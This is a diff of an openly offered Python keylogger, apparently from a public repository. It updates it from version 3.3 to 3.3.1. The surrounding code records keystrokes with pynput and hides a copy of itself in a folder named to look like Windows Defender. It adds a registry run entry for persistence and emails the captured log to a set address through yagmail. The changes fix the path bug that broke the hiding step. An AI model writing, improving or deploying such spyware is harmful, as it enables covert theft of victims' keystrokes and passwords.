@@ -10,22 +10,21 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.3
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.3.1
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
 import pynput
 from getpass import getuser # Obtiene el nombre del usuario
 from datetime import datetime
+from winreg import *
 import datetime
 import os
 import yagmail
 import shutil
-from winreg import *
-# Librería verifica internet 
-import socket
 import time
 import threading # Hilos
+import socket   # Librería verifica internet 
 
 
 # Convierte tecla a un valor legible
@@ -230,7 +229,7 @@ def sendEmail(log, sender_email, sender_password, receiver_email):
         ]
         yag.send(receiver_email, subject, contents, attachments=log )
         print("[+] Se envió el correo correctamente")
-        return True;
+        return True
     except:
         print("[-] No se pudo envíar el correo")
         return False
@@ -268,14 +267,14 @@ def EscondeKey():
     CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
     try:
         with open(FilePath(), 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
-            print("El keylogger ya se encontraba oculta en la carpeta: \n[C:\\Users\Public\\Security\\Windows Defender\\]")
+            print("El keylogger ya se encontraba oculta en la carpeta: \n["+FilePath()+"]")
     except :
         print("El Keylogger no se encuentra escondido...\nSe tratará de esconderlo...")
         try:
             shutil.copy(GetNameKey() , FilePath()) # Intenta ocultar el keylogger en una carpeta
-            print("El keylogger se escondió exitosamente en el sistema")
+            print("\nEl keylogger se escondió exitosamente en el sistema")
         except:
-            print("No se puedo esconder el Keylogger en el sistema")
+            print("\nHubo un problema al esconder el El keylogger")
 
 # Intervalo de tiempo que se enviará el archivo log.txt
 def SendLog():
@@ -336,7 +335,7 @@ def GetPathOcult():                 # Path de la carpeta donde se ocultará el K
 def LogName():  # 
     return ".key"
 def FilePath():
-    return str(GetPathOcult()+GetPathOcult())
+    return GetPathOcult()+GetNameKey()
 
 # Correo de envío [Primaria] 
 def emailP():                   # <<== Cambia éste correo
@@ -358,7 +357,7 @@ def ReceiveE():
        
 # Inicio multihilo
 if __name__ == '__main__':
-    
+
     EscondeKey()    # Se replica dentro de la computadora
     addStartup()    # Modifica registro de arranque
     p1 = threading.Thread(target=Klogger)   # Registra teclas
@@ -370,7 +369,7 @@ if __name__ == '__main__':
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v.3.3       #
+#                                                   v.3.3.1     #
 #################################################################
 # NOTAS IMPORTANTES:
 #
